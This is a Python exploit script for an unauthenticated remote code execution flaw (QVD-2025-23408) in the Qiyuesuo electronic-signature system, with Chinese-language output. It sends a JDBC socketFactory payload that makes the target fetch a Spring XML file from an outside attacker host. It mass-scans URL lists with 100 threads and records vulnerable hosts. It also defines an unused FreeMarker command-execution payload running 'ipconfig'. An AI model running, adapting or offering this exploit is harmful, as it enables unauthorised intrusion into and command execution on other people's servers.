import argparse,json,requests,sys,random
from multiprocessing.dummy import Pool
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    pass
def poc(target):
    payload = "/setup/dbtest?db=POSTGRESQL&host=localhost&port=5321&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F100.XX.XXX.85:8099%2F1%2Exml"
    user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    headers1={
        "User-Agent": random.choice(user_agents),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    headers2={
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close"
    }
    data = """moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522ipconfig%2522%29%257D%253C%252Fclob%253E&uuid=1"""
    try :
        res1 = requests.get(url=target,headers=headers1,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,headers=headers2,timeout=5,verify=False)
            if 'root' in res2.text:
                print(f"[+]{target}存在远程命令执行")
                with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+'\n')
            else:
                print (f"[-]{target}不存在远程命令执行")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        pass
def main():
    banner()

    parse = argparse.ArgumentParser(description= "QVD-2025-23408:契约锁电子签章系统未授权RCE漏洞")

    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")



    args = parse .parse_args()


    if args.url and not args.file:
 
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open (args.file,'r',encoding='utf-8') as fp :
            for i in fp.readlines() :
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else :
        print(f"usage:Python{sys.argv[0]} -h")

if __name__ == "__main__":
    main()
